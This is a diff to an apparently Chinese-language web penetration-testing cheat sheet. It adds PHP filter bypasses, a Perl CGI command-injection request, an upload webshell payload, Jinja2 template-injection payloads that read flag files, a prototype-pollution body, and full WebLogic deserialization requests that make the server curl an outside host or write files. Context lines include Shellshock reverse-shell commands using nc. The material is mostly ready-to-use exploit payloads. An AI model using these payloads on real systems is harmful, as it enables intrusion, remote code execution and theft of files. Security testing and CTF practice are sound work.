@@ -190,6 +190,13 @@ POST /xxx?p=php://input HTTP/1.1
 <?php+system('ls')?>
 ```
 
+绕过思路
+```
+php://filter//convert.iconv.UCS-4*/resource=/var/www/html/flag.php
+php://filter/string.rot13/resource=flag.php
+php://filter/zlib.deflate/resource=flag.php
+```
+
 PHP读取本地文件 结合远程文件包含使用
 `exp.php`
 ```PHP
@@ -328,13 +335,34 @@ curl -H "User-Agent: () { :; }; echo; /bin/bash -c 'which nc'" http://192.168.1.
 # 反弹shell
 curl -H "X-Frame-Options: () { :; }; echo; /bin/bash -c 'nc -e /bin/bash 192.168.1.26 4444'" http://192.168.1.39/cgi-bin/shell.sh
 ```
+perl
+```http
+POST /cgi-bin/file.pl?/bin/bash%20-c%20ls${IFS}/| HTTP/1.1
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymB2ISQZSMi8QsUUt
+
+------WebKitFormBoundarymB2ISQZSMi8QsUUt
+Content-Disposition: form-data; name="file"
+Content-Type: text/plain
+
+ARGV
+------WebKitFormBoundarymB2ISQZSMi8QsUUt
+Content-Disposition: form-data; name="file"; filename="abc.txt"
+Content-Type: text/plain
+
+abcd
+------WebKitFormBoundarymB2ISQZSMi8QsUUt
+Content-Disposition: form-data; name="Submit!"
+
+Submit!
+------WebKitFormBoundarymB2ISQZSMi8QsUUt--
+```
 
 ## 文件上传
 需要先判断是前端拦截还是后端拦截，还要判断是白名单，还是黑名单。
 前端拦截：直接改文件名，拦截请求后再改回来
 黑名单：
 1. 替换大小写
-2. 文件名后加空格/`.`/`::$DATA`
+2. 文件名后加空格或`.`或`::$DATA`或`/.`或`/xxx/..`
 3. 双写，如 `.pphphp`
 4. 使用短标签，如 `<?=eval($_POST['cmd']);?>`
 后端拦截常规处理：
@@ -345,6 +373,10 @@ curl -H "X-Frame-Options: () { :; }; echo; /bin/bash -c 'nc -e /bin/bash 192.168
 1. 上传 `.user.ini` 强制解析图片内容，使用 `auto_prepend_file=a.jpg` 或 `auto_append_file=a.jpg`
 webdav上传：[[11 安全工具#davtest|davtest]]
 
+示例：
+```
+con=<?php+@system($_GET['cmd']);+?>&file=shell.php/.
+```
 ## SSRF
 服务端请求伪造
 对内网影响比较大
@@ -378,6 +410,12 @@ webdav上传：[[11 安全工具#davtest|davtest]]
 # 执行系统命令
 {% import os %}{{ os.popen('which nc').read() }}
 # 有时不能引入模块 需要手动搜索所有模块找到os 下面两种都行
+
+# 通过__mro__或__base__ 找到<class 'object'>
+# 调用__subclasses__() 找 file直接用
+# 或warnings.catch_warnings中bytearray中的os模块 如
+{{().__class__.__bases__[0].__subclasses__()[189].__init__.__globals__.__builtins__['open']('/flag').read()}}
+
 {{[].__class__.__base__.__subclasses__()}}
 {{''.__class__.__mro__[2].__subclasses__()}}
 # 直接找os 或者其它 如 warnings.catch_warnings
@@ -388,7 +426,25 @@ webdav上传：[[11 安全工具#davtest|davtest]]
 {{[].__class__.__base__.__subclasses__()[59].__init__.func_globals.values()[13]['eval']("__import__('os').popen('cat fl4g').read()")}}
 # file可以直接读取文件
 {{[].__class__.__base__.__subclasses__()[40]("fl4g").read()}}
+
+# 通过request.args绕过
+{{''[request.args.a][request.args.b][2][request.args.c]()[40]('/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt')[request.args.d]()}}?a=__class__&b=__mro__&c=__subclasses__&d=read
 ```
+
+## JS原型链污染
+
+`{"username":"test","password":"test","__proto__":{"isAdmin":true}}`
+即
+```json
+{
+    "username": "test",
+    "password": "test",
+    "__proto__": {
+        "isAdmin": true
+    }
+}
+```
+
 ## 代码审计
 
 ### PHP
@@ -459,8 +515,8 @@ echo $a;
 如Java中的RMI，数据在其客户端和服务端之间都是以字节流的形式传递的，最终一定会反序列化（JRMP是规范RMI过程中数据传输的协议）
 JNDI更底层，可能的实现包括LDAP、RMI等，LDAP适用范围更广。原理：实例化的时候，对象的构造函数会自动执行，如果启动有恶意代码，那么客户端就会受到攻击。
 
-## 常见漏洞
-### Apache HTTP
+## 常见组件漏洞
+### Apache2
 #### 目录穿越
 2.4.49
 ```Shell
@@ -504,6 +560,17 @@ PoC，直接访问
 针对两个组件，URL分别为
 ```
 POST /wls-wsat/CoordinatorPortType HTTP/1.1
+```
+其它URL
+```
+/wls-wsat/CoordinatorPortType
+/wls-wsat/RegistrationPortTypeRPC
+/wls-wsat/ParticipantPortType
+/wls-wsat/RegistrationRequesterPortType
+/wls-wsat/CoordinatorPortType11
+/wls-wsat/RegistrationPortTypeRPC11
+/wls-wsat/ParticipantPortType11
+/wls-wsat/RegistrationRequesterPortType11
 ```
 和补丁后的绕过
 ```
@@ -15712,6 +15779,92 @@ show options
 set RHOSTS 192.168.40.225
 set LHOST 192.168.40.129
 exploit
+```
+更新后的利用
+```xml
+POST /_async/AsyncResponseService HTTP/1.1
+Host: 132.176.9.109:7003
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+Content-Type: text/xml
+Content-Length: 765
+
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing"
+xmlns:asy="http://www.bea.com/async/AsyncResponseService">
+<soapenv:Header>
+<wsa:Action>xx</wsa:Action>
+<wsa:RelatesTo>xx</wsa:RelatesTo>
+<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
+<void class="java.lang.ProcessBuilder">
+<array class="java.lang.String" length="3">
+<void index="0">
+<string>/bin/bash</string>
+</void>
+<void index="1">
+<string>-c</string>
+</void>
+<void index="2">
+<string>curl http://10.26.14.222:7331/QwErTy</string>
+</void>
+</array>
+<void method="start"/></void>
+</work:WorkContext>
+</soapenv:Header>
+<soapenv:Body>
+<asy:onAsyncDelivery/>
+</soapenv:Body></soapenv:Envelope>
+```
+无回显方式
+```xml
+POST /_async/AsyncResponseService HTTP/1.1
+Host: 132.175.9.111:7003
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+Content-Type: text/xml
+Content-Length: 821
+
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing"
+xmlns:asy="http://www.bea.com/async/AsyncResponseService">
+<soapenv:Header>
+<wsa:Action>xx</wsa:Action>
+<wsa:RelatesTo>xx</wsa:RelatesTo>
+<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
+<void class="java.lang.ProcessBuilder">
+<array class="java.lang.String" length="3">
+<void index="0">
+<string>/bin/bash</string>
+</void>
+<void index="1">
+<string>-c</string>
+</void>
+<void index="2">
+<string>echo "qwerty" &gt; servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/qwer.txt</string>
+</void>
+</array>
+<void method="start"/></void>
+</work:WorkContext>
+</soapenv:Header>
+<soapenv:Body>
+<asy:onAsyncDelivery/>
+</soapenv:Body></soapenv:Envelope>
+```
+对应路径
+```xml
+# 访问
+/bea_wls_internal/qwer.txt
+
+# 或
+<string>echo "123qwerty" &gt; servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/qwer.txt</string>
+# 对应
+/_async/qwer.txt
 ```
 
 #### t3协议 反序列化（CVE-2018-2628）
